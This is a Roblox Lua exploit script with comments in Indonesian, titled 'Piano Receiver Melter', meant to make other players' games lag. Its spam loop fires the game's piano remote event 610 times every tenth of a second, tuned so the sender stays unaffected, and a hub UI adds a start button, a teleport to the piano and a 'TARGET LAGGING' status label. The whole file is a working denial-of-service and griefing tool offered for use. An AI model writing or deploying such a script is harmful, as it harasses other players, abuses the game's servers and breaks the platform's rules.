-- ============================================
-- 🎹 CENN PIANO RECEIVER MELTER V12
-- Bikin Alt/Orang Lain Ngelag Parah, HP Sender Aman
-- ============================================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local PianoEvent = workspace:FindFirstChild("GlobalPianoConnector")
if not PianoEvent then
    task.spawn(function() PianoEvent = workspace:WaitForChild("GlobalPianoConnector", 10) end)
end

local enabled = false
local fireCount = 0
local isMinimized = false

-- ============================================
-- LOGIKA SPAM (BURST & REST)
-- ============================================
local function startSpam()
    if not PianoEvent then return false end
    enabled = true
    fireCount = 0
    
    task.spawn(function()
        while enabled do
            -- 🔥 BURST: Tembak 61 nada, ulangi 10 kali (610 tembakan instan)
            for i = 1, 10 do
                for note = 1, 61 do
                    if not enabled then break end
                    pcall(function()
                        PianoEvent:FireServer("play", note)
                    end)
                    fireCount = fireCount + 1
                end
            end
            
            -- 🔥 REST: Kasih jeda 0.1 detik buat HP Sender biar gak nge-lag
            -- Tapi di mata Si Penerima (Alt), 610 suara piano bakal muncul barengan!
            task.wait(0.1) 
        end
    end)
    return true
end

local function stopSpam()
    enabled = false
end

-- ============================================
-- UI CENN HUB (V7 SAFE UI)
-- ============================================
local gui = Instance.new("ScreenGui")
gui.Name = "CennPianoMelter"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 999
pcall(function() gui.Parent = game:GetService("CoreGui") end)
if not gui.Parent then gui.Parent = playerGui end

local CLR_BG = Color3.fromRGB(10, 10, 14)
local CLR_PANEL = Color3.fromRGB(18, 18, 24)
local CLR_BORDER = Color3.fromRGB(255, 30, 30)
local CLR_ON = Color3.fromRGB(220, 20, 20)
local CLR_OFF = Color3.fromRGB(40, 40, 50)
local CLR_TXT = Color3.fromRGB(255, 255, 255)
local CLR_TITLE = Color3.fromRGB(255, 80, 80)

local W, H_OPEN = 240, 260

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, W, 0, H_OPEN)
main.Position = UDim2.new(0.02, 0, 0.4, 0)
main.BackgroundColor3 = CLR_PANEL
main.BorderSizePixel = 0
main.Active = true
main.ClipsDescendants = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", main).Color = CLR_BORDER

local tbar = Instance.new("Frame", main)
tbar.Size = UDim2.new(1, 0, 0, 32)
tbar.BackgroundColor3 = CLR_BG
tbar.BorderSizePixel = 0
Instance.new("UICorner", tbar).CornerRadius = UDim.new(0, 10)

local titl = Instance.new("TextLabel", tbar)
titl.Size = UDim2.new(1, -64, 1, 0)
titl.Position = UDim2.new(0, 10, 0, 0)
titl.BackgroundTransparency = 1
titl.Font = Enum.Font.GothamBold
titl.TextSize = 11
titl.TextColor3 = CLR_TITLE
titl.TextXAlignment = Enum.TextXAlignment.Left
titl.Text = "🎹 RECEIVER MELTER"

local minBtn = Instance.new("TextButton", tbar)
minBtn.Size = UDim2.new(0, 24, 0, 22)
minBtn.Position = UDim2.new(1, -54, 0.5, -11)
minBtn.BackgroundColor3 = Color3.fromRGB(180, 160, 20)
minBtn.Text = "─"
minBtn.Font = Enum.Font.GothamBold
minBtn.TextColor3 = CLR_TXT
Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 5)

local closeBtn = Instance.new("TextButton", tbar)
closeBtn.Size = UDim2.new(0, 24, 0, 22)
closeBtn.Position = UDim2.new(1, -28, 0.5, -11)
closeBtn.BackgroundColor3 = Color3.fromRGB(170, 25, 25)
closeBtn.Text = "✕"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextColor3 = CLR_TXT
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 5)

local drag, ds, sp = false, nil, nil
tbar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
        drag = true; ds = i.Position; sp = main.Position
    end
end)
UserInputService.InputChanged:Connect(function(i)
    if drag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
        local d = i.Position - ds
        main.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y)
    end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then drag = false end
end)

minBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    TweenService:Create(main, TweenInfo.new(0.25), { Size = UDim2.new(0, W, 0, isMinimized and 32 or H_OPEN) }):Play()
    minBtn.Text = isMinimized and "□" or "─"
end)

closeBtn.MouseButton1Click:Connect(function()
    stopSpam()
    pcall(function() gui:Destroy() end)
end)

local Y = 40

local infoLbl = Instance.new("TextLabel", main)
infoLbl.Size = UDim2.new(1, -20, 0, 20)
infoLbl.Position = UDim2.new(0, 10, 0, Y)
infoLbl.BackgroundTransparency = 1
infoLbl.Font = Enum.Font.GothamBold
infoLbl.TextSize = 9
infoLbl.TextColor3 = Color3.fromRGB(150, 150, 150)
infoLbl.Text = "Mode: Burst & Rest (Sender Safe)"
Y = Y + 24

local tpBtn = Instance.new("TextButton", main)
tpBtn.Size = UDim2.new(1, -20, 0, 30)
tpBtn.Position = UDim2.new(0, 10, 0, Y)
tpBtn.BackgroundColor3 = Color3.fromRGB(30, 80, 160)
tpBtn.Text = "📍 TELEPORT KE PIANO"
tpBtn.Font = Enum.Font.GothamBold
tpBtn.TextSize = 10
tpBtn.TextColor3 = CLR_TXT
Instance.new("UICorner", tpBtn).CornerRadius = UDim.new(0, 6)
Y = Y + 36

tpBtn.MouseButton1Click:Connect(function()
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then hrp.CFrame = CFrame.new(363.90, 81.70, -1218.41) end
end)

local spamBtn = Instance.new("TextButton", main)
spamBtn.Size = UDim2.new(1, -20, 0, 40)
spamBtn.Position = UDim2.new(0, 10, 0, Y)
spamBtn.BackgroundColor3 = CLR_OFF
spamBtn.Text = "▶  START MELTING"
spamBtn.Font = Enum.Font.GothamBold
spamBtn.TextSize = 13
spamBtn.TextColor3 = CLR_TXT
Instance.new("UICorner", spamBtn).CornerRadius = UDim.new(0, 6)
Y = Y + 50

spamBtn.MouseButton1Click:Connect(function()
    if enabled then
        stopSpam()
        spamBtn.Text = "▶  START MELTING"
        spamBtn.BackgroundColor3 = CLR_OFF
        infoLbl.Text = "Status: BERHENTI"
        infoLbl.TextColor3 = Color3.fromRGB(150, 150, 150)
    else
        local success = startSpam()
        if success then
            spamBtn.Text = "⏹  STOP MELTING"
            spamBtn.BackgroundColor3 = CLR_ON
            infoLbl.Text = "Status: TARGET LAGGING!"
            infoLbl.TextColor3 = Color3.fromRGB(255, 100, 100)
        else
            infoLbl.Text = "Tunggu, mencari remote..."
            infoLbl.TextColor3 = Color3.fromRGB(255, 200, 100)
        end
    end
end)

local countLbl = Instance.new("TextLabel", main)
countLbl.Size = UDim2.new(1, -20, 0, 20)
countLbl.Position = UDim2.new(0, 10, 0, Y)
countLbl.BackgroundTransparency = 1
countLbl.Font = Enum.Font.GothamBold
countLbl.TextSize = 10
countLbl.TextColor3 = Color3.fromRGB(255, 200, 100)
countLbl.Text = "Remotes Fired: 0"

task.spawn(function()
    while gui.Parent do
        task.wait(0.2)
        countLbl.Text = "Remotes Fired: " .. fireCount
    end
end)

print("✅ CENN PIANO RECEIVER MELTER V12 Loaded")